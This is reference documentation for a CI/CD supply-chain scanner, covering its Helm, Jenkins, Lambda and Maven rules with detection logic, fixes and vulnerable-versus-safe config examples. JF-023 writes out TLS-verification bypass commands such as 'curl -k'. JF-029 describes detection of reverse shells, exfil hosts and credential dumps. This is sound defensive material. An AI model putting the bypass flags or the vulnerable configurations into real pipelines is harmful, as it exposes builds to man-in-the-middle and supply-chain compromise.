**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.

**Proof of exploit.**

```
# Vulnerable: ``Chart.yaml`` declares a redis dependency by
# version range but ``Chart.lock`` is absent. ``helm
# dependency build`` resolves the range against whatever the
# chart repo serves at install time. A compromised repo (or
# a malicious chart cache) substitutes a backdoored redis-
# 17.x tarball; the consuming cluster runs it.
# Chart.yaml
apiVersion: v2
name: my-app
version: 1.0.0
dependencies:
  - name: redis
    version: ^17.0.0
    repository: https://charts.bitnami.com/bitnami
# Chart.lock missing entirely — no integrity gate on
# ``helm dependency build``

# Safe: run ``helm dependency update`` and commit
# ``Chart.lock``. ``digest:`` is the sha256 of the resolved
# tarball; ``helm dependency build`` re-fetches and verifies
# the digest before unpacking. A swapped tarball changes the
# digest and the build fails loud instead of silently
# installing the substitute.
# Chart.lock
dependencies:
  - name: redis
    repository: https://charts.bitnami.com/bitnami
    version: 17.15.4
    digest: sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abcd
digest: sha256:9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba
generated: "2026-01-15T10:30:00Z"
```

**Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Walks ``Chart.yaml`` ``dependencies:`` (v2 charts only) and inspects each entry's ``repository:`` URL. Accepted schemes:

- ``https://``, chart-museum / OSS chart repos. The default for public Helm charts.
- ``oci://``, registry-hosted charts. TLS is enforced by the registry, not the URL scheme; we still accept this shape because Helm 3.8+ pulls OCI charts over HTTPS unless explicitly configured otherwise.
- ``file://``, in-repo dependency. No network surface.
- ``@alias``, local alias for a previously registered ``helm repo add`` URL. The scheme of the original URL is the user's responsibility (and is captured in the chart consumer's ``~/.config/helm/repositories.yaml``).

**Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``helm dependency build`` fetches the redis
# tarball over plaintext HTTP. Any on-path attacker
# (compromised proxy, malicious WiFi, BGP hijack on the
# internal mirror) substitutes a backdoored tarball; the
# consuming cluster unpacks it into the umbrella chart.
# ``Chart.lock``'s digest check (HELM-002) only catches
# this on the *next* update, not the compromised pull
# itself.
apiVersion: v2
name: my-app
version: 1.0.0
dependencies:
  - name: redis
    version: 17.15.4
    repository: http://internal-charts.example.com

# Safe: HTTPS gives TLS for the fetch; an OCI registry
# reference (``oci://``) goes through the registry's TLS
# config; a ``file://`` reference reads from disk inside
# the same repo, so there's no network surface at all.
apiVersion: v2
name: my-app
version: 1.0.0
dependencies:
  - name: redis
    version: 17.15.4
    repository: https://charts.bitnami.com/bitnami
  - name: postgres
    version: 12.1.0
    repository: oci://registry.example.com/charts
  - name: my-sidecar
    version: 0.1.0
    repository: file://../sidecar
```

**Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-004`: Chart dependency version is a range, not an exact pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-004 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** An exact pin is a string that contains only digits, dots, and at most a single leading ``v`` / trailing pre-release or build identifier (``1.2.3``, ``v1.2.3``, ``1.2.3-rc1``, ``1.2.3+build.5``). Anything carrying ``^`` / ``~`` / ``>`` / ``<`` / ``*`` / ``x`` / ``X`` / ``||`` / a space (``>=4 <5``) is treated as a range. The bias is toward false positives, a chart maintainer can suppress per-rule via ``--ignore-file`` if they specifically want range semantics, but the default for production charts is a pin.

**Recommendation.** Replace each ``dependencies[].version`` constraint with the exact resolved version from ``Chart.lock``. ``17.0.0`` instead of ``^17.0.0``, ``v1.2.3`` instead of ``~1.2``. Range syntax (``^``, ``~``, ``>=``, ``*``, ``x``) lets ``helm dependency update`` move every consumer of the chart to a newer dep on the next refresh, even when the lock file looked stable.

**Source:** [`HELM-004`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-005`: Chart maintainers field empty or missing chain-of-custody info <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-005 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** An ``maintainers:`` entry is considered usable when the value is a YAML mapping with ``name:`` set to a non-empty string and at least one of ``email:`` / ``url:`` populated. Entries that look like ``- name: TODO`` or carry blank contact fields fail the rule the same way a missing block does, the field exists but doesn't carry a real chain-of-custody signal.

**Recommendation.** Populate ``maintainers:`` in ``Chart.yaml`` with at least one entry carrying a ``name`` plus either an ``email`` or a ``url``. The ``name`` is the human a downstream consumer files an issue against; the contact field is the channel they reach. Charts published to ArtifactHub or an internal registry without this field are silently anonymous, fine for a personal scratch chart, not for one your CI pipeline will deploy to production.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) often ship without maintainers when distributed inside a single team's monorepo where the org-level CODEOWNERS already names the contact. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-005`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-007`: Chart.yaml description field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Walks ``Chart.yaml`` ``description:`` and fires when the field is missing, ``None``, or a string that's empty after stripping whitespace. The Helm chart spec doesn't enforce the field but every chart published to ArtifactHub or the upstream stable repo populates it; production charts that ship without it are usually a copy-paste-from-template oversight.

**Recommendation.** Set ``description:`` in ``Chart.yaml`` to a one-sentence summary of what the chart deploys (e.g. ``description: Postgres 14 cluster with WAL-G backups and a Prometheus exporter``). Helm registries display this string in chart listings; without it, anyone browsing has to read the README to figure out what the chart does.

**Source:** [`HELM-007`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-008`: Chart.lock generated more than 90 days ago <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-008 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Reads ``Chart.lock``'s top-level ``generated:`` timestamp (an ISO-8601 string Helm writes when the lock was last regenerated) and compares against ``now``. Fires when the delta is more than 90 days. Charts without ``Chart.lock`` are skipped. HELM-002 covers the missing-lock case directly. Charts whose ``generated:`` field is malformed or absent silently pass on this rule (HELM-002 covers the absent-lock case from a different angle).

**Recommendation.** Run ``helm dependency update`` against every dependency-carrying chart at least once per release cycle, and commit the regenerated ``Chart.lock``. The lock pins versions and digests; the *update cadence* is what brings in CVE fixes and deprecation notices from the last quarter. CI can run the same command against ``main`` weekly to surface drift as a PR rather than letting the lock sit stale until the next release.

**Known false positives.**

- A chart that pins exact versions and never needs new dependencies (e.g. a chart packaging a single internal library that itself updates rarely) may legitimately have a stale Chart.lock. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-008`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-009`: Chart home / sources URL uses a non-HTTPS scheme <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-009 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Walks ``Chart.yaml`` ``home:`` (single string) and ``sources:`` (list of strings). Fires on any value whose scheme is ``http://``, ``ftp://``, or other plaintext form. Empty / missing fields pass, the rule only evaluates URLs that are *populated* with the wrong scheme. HELM-003 covers the same risk for dependency-repo URLs.

**Recommendation.** Switch every ``home:`` URL and every entry in ``sources:`` to ``https://``. Most chart-listing UIs display these as click-through links from a public chart registry; serving them over plaintext is a confused-deputy footgun for anyone evaluating the chart's provenance. ``http://`` URLs against ``localhost`` are not exempted, production charts shouldn't ship references to a developer-local endpoint anyway.

**Source:** [`HELM-009`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-010`: Chart.yaml appVersion field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-010 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Library charts (``Chart.yaml`` ``type: library``) legitimately don't have an ``appVersion`` because they package no application. Those are exempted. For application charts (``type: application``, the default), ``appVersion`` is required for CVE tracking and release-tracking; without it, ``helm list`` shows ``-`` in the AppVersion column and downstream consumers have no signal.

**Recommendation.** Set ``appVersion:`` in ``Chart.yaml`` to the version of the application the chart packages (e.g. ``appVersion: "17.2"`` for a Postgres-17.2 chart at ``version: 1.4.2``). When the upstream application releases, bump ``appVersion`` and re-cut the chart. Helm's CLI displays ``appVersion`` alongside the chart version in ``helm list``, so downstream operators can see which app version is running where.

**Source:** [`HELM-010`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `JF-001`: Shared library not pinned to a tag or commit <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** `@main`, `@master`, `@develop`, no-`@ref`, and any non-semver / non-SHA ref are floating. Whoever controls the upstream library can ship code into your build by pushing to that branch.

**Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.

**Proof of exploit.**

```
// Vulnerable: every build resolves @main against the
// shared-library repo. A push to main (legitimate update
// from a teammate, a credential leak, a compromised
// maintainer account) is silently picked up on the next
// pipeline run with the build's full credential set in
// scope (CI_JOB_TOKEN-equivalent, Jenkins credentials,
// agent secrets).
@Library('build-utils@main') _

pipeline {
  agent any
  stages {
    stage('deploy') {
      steps {
        deployToProd()  // sourced from the shared library
      }
    }
  }
}

// Safe: pin to a release tag (or 40-char commit SHA) and
// disable 'Allow default version to be overridden' on the
// library config in Jenkins so a pipeline can't escape
// the pin by re-declaring the @Library line.
@Library('build-utils@v1.4.2') _

pipeline {
  agent any
  stages {
    stage('deploy') {
      steps {
        deployToProd()
      }
    }
  }
}
```

**Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).

### `JF-005`: Deploy stage missing manual `input` approval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-005 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** A stage named `deploy` / `release` / `publish` / `promote` should either use the declarative `input { ... }` directive or call `input message: ...` somewhere in its body. Without one, any push that triggers the pipeline ships to the target with no human review.

**Recommendation.** Add an `input` step to every deploy-like stage (e.g. `input message: 'Promote to prod?', submitter: 'releasers'`). Combine with a Jenkins folder-scoped permission so only release engineers see the prompt.

**Source:** [`JF-005`](../providers/jenkins.md#jf-005) in the [Jenkins provider](../providers/jenkins.md).

### `JF-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears in executable Jenkinsfile text (comments are stripped before matching).

**Recommendation.** Add a `sh 'cosign sign --yes …'` step (the cosign-installer Jenkins plugin handles binary install). Publish the signature next to the artifact and verify it at deploy.

**Source:** [`JF-006`](../providers/jenkins.md#jf-006) in the [Jenkins provider](../providers/jenkins.md).

### `JF-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Passes when a direct SBOM tool token (CycloneDX, syft, anchore, spdx-sbom-generator, sbom-tool) appears in executable code, or when Trivy is paired with `sbom` / `cyclonedx` in the same file. Comments are stripped before matching.

**Recommendation.** Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format cyclonedx`) and archive the result with `archiveArtifacts`.

**Source:** [`JF-007`](../providers/jenkins.md#jf-007) in the [Jenkins provider](../providers/jenkins.md).

### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.

**Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).

### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a Jenkinsfile. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).

### `JF-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-020 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`JF-020`](../providers/jenkins.md#jf-020) in the [Jenkins provider](../providers/jenkins.md).

### `JF-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-021`](../providers/jenkins.md#jf-021) in the [Jenkins provider](../providers/jenkins.md).

### `JF-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`JF-022`](../providers/jenkins.md#jf-022) in the [Jenkins provider](../providers/jenkins.md).

### `JF-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-023 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).

### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** JF-005 already flags deploy stages with no ``input`` step. This rule catches the subtler case: the gate exists, but it doesn't actually restrict approvers. ``submitter`` accepts a comma-separated list of Jenkins usernames and group names; scope it to the smallest release-eligible pool.

**Recommendation.** Add a ``submitter: 'releasers,sre'`` (or a single role) argument to every ``input`` step in a deploy-like stage. Without it, any user with the Jenkins job ``Build`` permission can approve a production promotion, the approval gate becomes advisory.

**Source:** [`JF-024`](../providers/jenkins.md#jf-024) in the [Jenkins provider](../providers/jenkins.md).

### `JF-028`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-028 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** ``cosign sign`` signs the artifact bytes. ``cosign attest`` signs an in-toto statement describing how the build ran, builder, source commit, input parameters. SLSA L3 verifiers check the latter so consumers can enforce policy on where and how artifacts were produced.

**Recommendation.** Add a ``sh 'cosign attest --predicate=provenance.intoto.jsonl …'`` step after the build, or integrate the TestifySec ``witness run`` attestor. JF-006 covers signing; this rule covers the build-provenance statement SLSA Build L3 requires.

**Source:** [`JF-028`](../providers/jenkins.md#jf-028) in the [Jenkins provider](../providers/jenkins.md).

### `JF-029`: Jenkinsfile contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-029 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Distinct from JF-016 (curl pipe) and JF-019 (Groovy sandbox escape). Those flag risky defaults; this flags concrete evidence, reverse shells, base64-decoded execution, miner binaries, exfil channels, credential-dump pipes, shell-history erasure. Runs on the comment-stripped Groovy text so ``// cosign verify … // webhook.site`` in a legitimate annotation doesn't false-positive.

**Recommendation.** Treat as a potential compromise. Identify the commit that introduced the matching stage(s), rotate Jenkins credentials the job can reach, review controller/agent audit logs for outbound traffic to the matched hosts, and re-image the agent pool if the compromise may have persisted.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).

### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Complements JF-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Artifactory, Nexus) instead of installing from a filesystem path or tarball URL.

**Source:** [`JF-031`](../providers/jenkins.md#jf-031) in the [Jenkins provider](../providers/jenkins.md).

### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.

**Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.

**Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).

### `LMB-001`: Lambda function has no code-signing config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-001 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Lambda code-signing config + a Signer profile (SIGN-001) validates that an uploaded zip was signed by a known profile before it's allowed to run. Without one, anyone who reaches ``lambda:UpdateFunctionCode``, a CI/CD role compromise, a misattached IAM policy, can replace the function's code with no chain-of-custody check.

**Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.

**Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `MVN-001`: pom.xml dependency uses a floating version range <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on any ``<version>`` value that matches the Maven range grammar: bracket-or-paren-delimited intervals (``[1.0,2.0)``, ``(,3.0]``), open ranges (``[1.0,)``), or the legacy floating tokens ``LATEST`` / ``RELEASE``. Property references (``${spring.version}``) are resolved against the POM's ``<properties>`` block before the check runs, so a property pointing at a range still fires.

Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (that's MVN-004's surface) because the version-management section's purpose is to centralize version literals, not consume them at install time.

**Recommendation.** Replace Maven version ranges (``[1.0,2.0)``, ``[1.0,)``, ``LATEST``, ``RELEASE``) with an exact version pin (``<version>1.2.3</version>``). The range form lets Maven pick any later release that fits, so a compromised patch version reaches the build without a code change. Pair the exact-pin manifest with a verified-by-checksum or verified-by-signature repository policy (MVN-005) so a tampered jar at the same version literal still fails.

**Known false positives.**

- Multi-module reactor builds sometimes legitimately use ``${project.version}`` (the reactor's own version) which resolves to a plain string from the parent POM. The rule honors property substitution so this passes; if it does fire on a deliberate range (e.g. a build-time tool pulled via a range you control), suppress with a one-line rationale.

**Seen in the wild.**

- Codecov Bash Uploader compromise (April 2021): downstream builds pulling Codecov via mutable references shipped the tampered uploader for two months. The Maven-side analog is any range-pinned ``codecov`` / scanner / agent jar; same exposure window. https://about.codecov.io/security-update/

**Proof of exploit.**

```
<!-- Vulnerable: range admits a future patch version. -->
<dependency>
  <groupId>org.example</groupId>
  <artifactId>util</artifactId>
  <version>[1.0,2.0)</version>
</dependency>

<!-- Attack: the maintainer's account is hijacked and a
     malicious 1.7.99 is published. Next ``mvn install``
     resolves the range and pulls the poisoned jar without
     any pom.xml change. -->

<!-- Safe: exact pin. A swap at the same coordinate breaks
     the checksum/signature gate (MVN-005). -->
<dependency>
  <groupId>org.example</groupId>
  <artifactId>util</artifactId>
  <version>1.7.0</version>
</dependency>
```

**Source:** [`MVN-001`](../providers/maven.md#mvn-001) in the [maven provider](../providers/maven.md).

### `MVN-002`: pom.xml depends on a mutable SNAPSHOT version <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-002 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on any non-managed ``<version>`` ending in ``-SNAPSHOT`` (case-insensitive). Property references are resolved against the POM's ``<properties>`` first, so a property whose value ends in ``-SNAPSHOT`` still trips the rule. ``<dependencyManagement>`` entries are exempt; centralized version literals are MVN-004's surface.

**Recommendation.** Replace ``-SNAPSHOT`` versions with a released, immutable version (``1.2.3``, not ``1.2.3-SNAPSHOT``). Maven treats SNAPSHOT artifacts as mutable: the repository can re-deploy the same coordinate, and ``mvn install`` will pull whatever is current at resolution time. Snapshot dependencies belong to the development inner loop; gate them out of release builds and CI build pipelines.

**Known false positives.**

- Multi-module reactor builds where every sibling references ``${project.version}-SNAPSHOT`` during local development. Suppress in your local profile or scope the scan to the release POM; gating release builds on SNAPSHOT-free deps is exactly what this rule is for.

**Source:** [`MVN-002`](../providers/maven.md#mvn-002) in the [maven provider](../providers/maven.md).

### `MVN-003`: pom.xml declares a plaintext-HTTP Maven repository <span class="pg-sev pg-sev--high">HIGH</span> { #detail-mvn-003 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires on any ``<repository>``, ``<pluginRepository>``, or ``<distributionManagement>`` URL using the ``http://`` scheme. ``file://`` and ``https://`` are exempt. The rule evaluates both project POMs and per-user / per-CI ``settings.xml`` mirror entries via the orchestrator.

**Recommendation.** Change every ``<repository><url>`` to ``https://`` and delete any ``<repository>`` whose host doesn't expose TLS. Plaintext-HTTP repositories let a network attacker swap downloaded jars in flight (the canonical Maven supply-chain MITM attack); ``https://`` plus the repository's published checksums (MVN-005) is the minimum baseline.

**Known false positives.**

- Internal Maven repositories on a fully-isolated build network sometimes legitimately serve over HTTP. If you can actually attest that the network path is end-to-end untamperable (a single-tenant air-gapped subnet), suppress with a rationale naming that boundary.

**Seen in the wild.**

- Maven Central enforced HTTPS-only for the central repository in January 2020; the legacy ``http://repo1.maven.org`` endpoint was retired specifically because of MITM-tampering attacks against downstream consumers. https://blog.sonatype.com/central-repository-moving-to-https

**Proof of exploit.**

```
<!-- Vulnerable: Maven fetches every dependency tarball
     and pom from this repository over plaintext HTTP. Any
     on-path attacker (compromised proxy, malicious VPN
     exit, internal mirror BGP hijack) substitutes a
     backdoored jar in flight. Maven's checksum verification
     only checks against checksums served by the SAME host,
     so the attacker swaps both the artifact and the
     adjacent .sha1 file. -->
<project>
  <repositories>
    <repository>
      <id>internal-mirror</id>
      <url>http://nexus.internal.example.com/repository/maven-public/</url>
    </repository>
  </repositories>
</project>

<!-- Safe: HTTPS gives TLS for both jar and checksum fetch.
     For internal Nexus / Artifactory hosts on a private CA,
     install the CA in the build agent's truststore;
     never fall back to plaintext HTTP. -->
<project>
  <repositories>
    <repository>
      <id>internal-mirror</id>
      <url>https://nexus.internal.example.com/repository/maven-public/</url>
    </repository>
  </repositories>
</project>
```

**Source:** [`MVN-003`](../providers/maven.md#mvn-003) in the [maven provider](../providers/maven.md).

### `MVN-004`: pom.xml dependency omits an explicit ``<version>`` <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-mvn-004 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on any non-managed ``<dependency>`` whose ``<version>`` element is absent or empty. Managed entries in ``<dependencyManagement>`` are the *source* of the version and intentionally out of scope for the entire Maven rule pack (MVN-001 / MVN-002 / MVN-004 all iterate ``iter_real_dependencies(...)``, which skips managed entries) — a BOM-style version-management block is its own surface and is audited via the inherited POM.

